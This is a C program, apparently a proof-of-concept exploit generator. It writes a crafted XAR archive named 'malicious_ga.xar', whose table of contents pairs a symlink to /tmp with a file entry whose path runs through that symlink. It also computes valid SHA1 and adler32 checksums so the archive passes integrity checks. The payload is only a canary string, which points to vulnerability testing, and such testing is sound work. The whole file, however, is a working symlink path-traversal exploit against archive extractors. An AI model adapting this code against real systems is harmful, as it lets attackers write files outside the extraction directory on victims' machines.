#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <CommonCrypto/CommonDigest.h>

#define XAR_MAGIC      0x78617221
#define XAR_CKSUM_SHA1 1

static void compress_data(const unsigned char *in, size_t inlen,
                          unsigned char **out, size_t *outlen) {
    *outlen = compressBound(inlen) + 16;
    *out = malloc(*outlen);
    z_stream s = {0};
    deflateInit2(&s, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15, 8, Z_DEFAULT_STRATEGY);
    s.next_in  = (Bytef*)in;  s.avail_in  = (uInt)inlen;
    s.next_out = *out;        s.avail_out = (uInt)*outlen;
    deflate(&s, Z_FINISH);
    deflateEnd(&s);
    *outlen = s.total_out;
}

static uLong adler32_buf(const unsigned char *buf, size_t len) {
    return adler32(0L, buf, (uInt)len);
}

int main(void) {
    /* ---- payload ---- */
    const char *payload_str = "XAR_SYMLINK2_GATE_A_FLAT_RUN24\n";
    const unsigned char *payload = (const unsigned char*)payload_str;
    size_t payload_len = strlen(payload_str);

    /* ---- compress payload ---- */
    unsigned char *cz = NULL;
    size_t czlen = 0;
    compress_data(payload, payload_len, &cz, &czlen);

    /* ---- compute adler32 checksums for TOC ---- */
    uLong adler_raw  = adler32_buf(payload, payload_len);
    uLong adler_comp = adler32_buf(cz, czlen);

    /* ---- compute real SHA1 of heap file-data region (= cz) ---- */
    unsigned char sha1_hash[CC_SHA1_DIGEST_LENGTH]; /* 20 bytes */
    CC_SHA1(cz, (CC_LONG)czlen, sha1_hash);

    /* ---- build TOC XML ----
     * Flat layout (both entries top-level, NOT nested):
     *   id=1  name=link_to_tmp         type=symlink  link=/tmp
     *   id=2  name=link_to_tmp/xar_gated_canary_macos.txt  type=file
     *          offset=20 (after 20-byte SHA1 in heap)
     * Heap checksum: style="sha1" offset=0 size=20
     */
    char toc_xml[4096];
    int tlen = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<xar><toc>"
        "<checksum style=\"sha1\"><offset>0</offset><size>20</size></checksum>"
        "<file id=\"1\">"
          "<name>link_to_tmp</name><type>symlink</type><link>/tmp</link>"
        "</file>"
        "<file id=\"2\">"
          "<name>link_to_tmp/xar_gated_canary_macos.txt</name><type>file</type>"
          "<data>"
            "<offset>20</offset><size>%zu</size><length>%zu</length>"
            "<encoding style=\"application/x-gzip\"/>"
            "<extracted-checksum style=\"adler32\">%lu</extracted-checksum>"
            "<archived-checksum style=\"adler32\">%lu</archived-checksum>"
          "</data>"
        "</file>"
        "</toc></xar>",
        payload_len, czlen,
        (unsigned long)adler_raw, (unsigned long)adler_comp);
    if (tlen <= 0 || (size_t)tlen >= sizeof(toc_xml)) {
        fprintf(stderr, "TOC too large\n"); return 1;
    }
    size_t toc_xml_len = (size_t)tlen;

    /* ---- compress TOC ---- */
    unsigned char *tocz = NULL;
    size_t toczlen = 0;
    compress_data((const unsigned char*)toc_xml, toc_xml_len, &tocz, &toczlen);

    /* ---- XAR header (28 bytes) ---- */
    uint8_t hdr[28];
    uint32_t magic   = htonl(XAR_MAGIC);
    uint16_t hdrsize = htons(28);
    uint16_t version = htons(1);
    uint32_t cktype  = htonl(XAR_CKSUM_SHA1);   /* 1 = SHA1 */
    uint64_t toc_compressed_len   = __builtin_bswap64((uint64_t)toczlen);
    uint64_t toc_uncompressed_len = __builtin_bswap64((uint64_t)toc_xml_len);
    memcpy(hdr+ 0, &magic,                 4);
    memcpy(hdr+ 4, &hdrsize,               2);
    memcpy(hdr+ 6, &version,               2);
    memcpy(hdr+ 8, &toc_compressed_len,    8);
    memcpy(hdr+16, &toc_uncompressed_len,  8);
    memcpy(hdr+24, &cktype,                4);

    /* ---- write XAR: hdr | toc_compressed | sha1_hash(20) | file_data ---- */
    FILE *f = fopen("malicious_ga.xar", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(hdr,      1, 28,   f);
    fwrite(tocz,     1, toczlen, f);
    fwrite(sha1_hash,1, 20,  f);   /* real SHA1 of file-data region */
    fwrite(cz,       1, czlen, f); /* compressed payload */
    fclose(f);

    printf("[+] malicious_ga.xar: 28+%zu+20+%zu bytes\n", toczlen, czlen);
    printf("[*] SHA1(heap[20:]): ");
    for (int i = 0; i < 20; i++) printf("%02x", sha1_hash[i]);
    printf("\n");
    printf("[*] Flat: id=1 link_to_tmp->symlink->/tmp  "
           "id=2 link_to_tmp/xar_gated_canary_macos.txt->file(offset=20)\n");
    free(cz); free(tocz);
    return 0;
}
